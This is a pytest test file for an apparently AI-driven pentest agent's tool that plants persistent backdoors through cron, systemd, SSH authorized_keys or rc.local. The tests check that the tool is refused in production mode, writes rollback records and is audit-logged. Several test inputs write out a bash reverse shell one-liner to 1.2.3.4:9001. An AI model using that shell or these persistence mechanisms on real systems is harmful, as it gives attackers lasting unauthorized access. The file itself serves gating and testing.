"""Wave 5 / C11 — Persistent backdoor primitive tests.

Asserted properties:
  - Mode gating: drop_persistent_backdoor refuses under production /
    bbp at the runtime body check.
  - Filter integration: filter_tools_for_mode drops the tool under
    production.
  - Mechanism templates render correctly for cron / systemd /
    ssh_authorized_key / rc_local.
  - Each drop writes a rollback metadata record under
    deliverables/ctf_backdoor_rollback/<ts>-<mech>.json with both the
    drop_oneliner and the cleanup_oneliner present (so the writeup can
    prove the box can be restored).
  - Audit log records the drop with mode=ctf.
  - render_backdoor_payload raises ValueError on missing required
    fields (callback or pubkey).
"""

from __future__ import annotations

import asyncio
import json
from datetime import date, timedelta
from pathlib import Path

import pytest
import yaml

from sentinel.agent.pentest import persistent_backdoor as p_persist
from sentinel.agent.pentest import tools as p_tools
from sentinel.core.engagement_mode import (
    EngagementMode, filter_tools_for_mode,
)
from sentinel.core.scope import Scope


def _scope_yaml(tmp_path: Path, **overrides) -> Path:
    today = date.today()
    data = {
        "client": "ctf-client",
        "engagement_id": "ctf-persist-001",
        "authorized_by": "test@example.com",
        "valid_from": (today - timedelta(days=1)).isoformat(),
        "valid_until": (today + timedelta(days=30)).isoformat(),
        "targets": {"domains": ["target.com"], "ips": []},
        "rate_limits": {"requests_per_second": 5},
    }
    data.update(overrides)
    p = tmp_path / "scope.yaml"
    p.write_text(yaml.safe_dump(data))
    return p


def _make_ctx(tmp_path: Path, *, mode: str = "ctf",
                **scope_overrides) -> p_tools.PentestContext:
    log_path = tmp_path / "audit.jsonl"
    s = Scope.load(
        _scope_yaml(tmp_path, engagement_mode=mode, **scope_overrides),
        audit_log_path=log_path,
    )
    workspace = tmp_path / "ws"
    workspace.mkdir(exist_ok=True)

    class _StubHttp:
        async def get(self, *a, **k):
            class _R:
                status_code = 200; text = ""; headers = {}; url = ""
            return _R()

    ctx = p_tools.PentestContext(
        scope=s, audit=s.audit_log, workspace_dir=workspace,
        http=_StubHttp(),  # type: ignore[arg-type]
        rate_limit_per_host_sec=0.0,
    )
    p_tools.set_context(ctx)
    return ctx


# ---- render_backdoor_payload helpers ------------------------------------


def test_render_cron_includes_drop_and_cleanup():
    p = p_persist.render_backdoor_payload(
        "cron", callback="bash -c 'sh -i >& /dev/tcp/1.2.3.4/9001 0>&1'",
        expires_at_iso="2026-XX-XXT12:00:00Z",
    )
    assert "*/5 * * * *" in p["drop_oneliner"]
    assert "SENTINEL_BACKDOOR" in p["drop_oneliner"]
    assert "SENTINEL_BACKDOOR" in p["cleanup_oneliner"]
    assert p["marker"] == "SENTINEL_BACKDOOR"


def test_render_systemd_includes_unit_lifecycle():
    p = p_persist.render_backdoor_payload(
        "systemd", callback="/tmp/payload.sh",
        expires_at_iso="2026-XX-XXT12:00:00Z",
    )
    assert "systemctl enable --now" in p["drop_oneliner"]
    assert "systemctl disable --now" in p["cleanup_oneliner"]
    assert "sentinel-backdoor.service" in p["drop_oneliner"]
    assert "rm -f /etc/systemd/system/sentinel-backdoor.service" in p["cleanup_oneliner"]


def test_render_ssh_authorized_key_appends_marker():
    p = p_persist.render_backdoor_payload(
        "ssh_authorized_key",
        pubkey="ssh-ed25519 AAAAabcdef test@op",
        expires_at_iso="2026-XX-XXT12:00:00Z",
    )
    assert "authorized_keys" in p["drop_oneliner"]
    assert "sentinel-backdoor-2026-XX-XXT12:00:00Z" in p["drop_oneliner"]
    assert "sed -i" in p["cleanup_oneliner"]
    assert "sentinel-backdoor-" in p["marker"]


def test_render_rc_local_inserts_before_exit_zero():
    p = p_persist.render_backdoor_payload(
        "rc_local", callback="/tmp/payload.sh",
        expires_at_iso="2026-XX-XXT12:00:00Z",
    )
    assert "/etc/rc.local" in p["drop_oneliner"]
    assert "SENTINEL_BACKDOOR" in p["drop_oneliner"]
    assert "rc.local" in p["cleanup_oneliner"]


def test_render_unknown_mechanism_raises():
    with pytest.raises(ValueError):
        p_persist.render_backdoor_payload("rootkit", callback="x")


def test_render_cron_requires_callback():
    with pytest.raises(ValueError):
        p_persist.render_backdoor_payload(
            "cron", callback="", expires_at_iso="z",
        )


def test_render_ssh_requires_pubkey():
    with pytest.raises(ValueError):
        p_persist.render_backdoor_payload(
            "ssh_authorized_key", pubkey="", expires_at_iso="z",
        )


# ---- MCP tool: mode gating -----------------------------------------------


def test_drop_persistent_backdoor_refuses_under_production(tmp_path):
    ctx = _make_ctx(tmp_path, mode="production")
    result = asyncio.run(p_persist.drop_persistent_backdoor.handler({
        "mechanism": "cron", "callback": "bash -c 'x'",
        "target_host": "victim.htb",
    }))
    assert result.get("is_error")


def test_drop_persistent_backdoor_refuses_under_bbp(tmp_path):
    ctx = _make_ctx(tmp_path, mode="bbp")
    result = asyncio.run(p_persist.drop_persistent_backdoor.handler({
        "mechanism": "cron", "callback": "bash -c 'x'",
    }))
    assert result.get("is_error")


def test_drop_persistent_backdoor_runs_under_ctf(tmp_path):
    ctx = _make_ctx(tmp_path, mode="ctf")
    result = asyncio.run(p_persist.drop_persistent_backdoor.handler({
        "mechanism": "cron",
        "callback": "bash -c 'sh -i >& /dev/tcp/1.2.3.4/9001 0>&1'",
        "target_host": "victim.htb",
        "cleanup_after_seconds": 3600,
    }))
    assert not result.get("is_error"), result
    text = result["content"][0]["text"]
    assert "Drop one-liner" in text
    assert "Cleanup one-liner" in text


def test_drop_persistent_backdoor_writes_rollback_metadata(tmp_path):
    ctx = _make_ctx(tmp_path, mode="ctf")
    asyncio.run(p_persist.drop_persistent_backdoor.handler({
        "mechanism": "ssh_authorized_key",
        "pubkey": "ssh-ed25519 AAAAA test@op",
        "target_host": "victim.htb",
    }))
    rollback_dir = ctx.workspace_dir / "deliverables" / "ctf_backdoor_rollback"
    assert rollback_dir.is_dir()
    files = list(rollback_dir.glob("*.json"))
    assert len(files) == 1, f"expected 1 rollback file, got {files}"
    rec = json.loads(files[0].read_text())
    # Each rollback record has both the drop and the cleanup oneliner.
    assert rec["drop_oneliner"]
    assert rec["cleanup_oneliner"]
    assert "sentinel-backdoor-" in rec["marker"]
    assert rec["mechanism"] == "ssh_authorized_key"
    assert rec["target_host"] == "victim.htb"


def test_drop_persistent_backdoor_audit_logs_with_mode(tmp_path):
    ctx = _make_ctx(tmp_path, mode="ctf")
    asyncio.run(p_persist.drop_persistent_backdoor.handler({
        "mechanism": "cron", "callback": "bash -c 'echo'",
    }))
    log = (tmp_path / "audit.jsonl").read_text()
    entries = [json.loads(l) for l in log.strip().splitlines()]
    matching = [e for e in entries if e.get("event") == "drop_persistent_backdoor"]
    assert matching, f"no drop_persistent_backdoor in audit"
    assert matching[0].get("mode") == "ctf"


def test_drop_persistent_backdoor_unknown_mechanism_rejected(tmp_path):
    ctx = _make_ctx(tmp_path, mode="ctf")
    result = asyncio.run(p_persist.drop_persistent_backdoor.handler({
        "mechanism": "rootkit_lkm", "callback": "x",
    }))
    assert result.get("is_error")
    assert "rootkit_lkm" in result["content"][0]["text"]


def test_drop_persistent_backdoor_missing_callback_rejected(tmp_path):
    ctx = _make_ctx(tmp_path, mode="ctf")
    result = asyncio.run(p_persist.drop_persistent_backdoor.handler({
        "mechanism": "cron",  # missing callback
    }))
    assert result.get("is_error")


# ---- Filter integration -------------------------------------------------


def test_filter_drops_persistence_in_production():
    filtered = filter_tools_for_mode(p_persist.ALL_TOOLS, EngagementMode.PRODUCTION)
    assert filtered == [], (
        f"production must drop drop_persistent_backdoor; got: "
        f"{[t.name for t in filtered]}"
    )


def test_filter_keeps_persistence_in_ctf_and_lab():
    for mode in (EngagementMode.CTF, EngagementMode.LAB):
        filtered = filter_tools_for_mode(p_persist.ALL_TOOLS, mode)
        names = {t.name for t in filtered}
        assert "drop_persistent_backdoor" in names
